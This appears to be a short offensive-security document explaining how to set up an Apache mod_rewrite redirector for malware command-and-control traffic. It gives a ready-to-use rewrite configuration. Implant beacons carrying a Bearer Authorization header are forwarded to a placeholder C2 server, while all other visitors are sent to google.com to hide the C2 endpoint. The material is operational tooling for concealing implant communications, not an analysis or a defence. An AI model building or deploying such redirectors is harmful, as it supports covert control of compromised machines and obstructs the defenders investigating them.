# Apache Configuration

## HTTP Auth Beacon
The HTTP auth beacon sends the id of our implant to the C2 server in the Authorization header. We need to configure Apache to redirect our implant traffic to our C2 server and redirect all other traffic to a benign server. The following Apache configuration options will redirect any request that includes the Authorization header with a Bearer token to our C2 server and all other traffic to google.com.

    RewriteEngine On

    RewriteCond %{HTTP:Authorization} ^Bearer
    RewriteRule (.*) http://c2.server.address:port/ [L]

    RewriteRule (.*) https://google.com [L]

A similar technique can be used to reroute traffic based on many other properties of the HTTP request. The mod_rewrite documentation should provide you with a number of ideas. http://httpd.apache.org/docs/current/mod/mod_rewrite.html
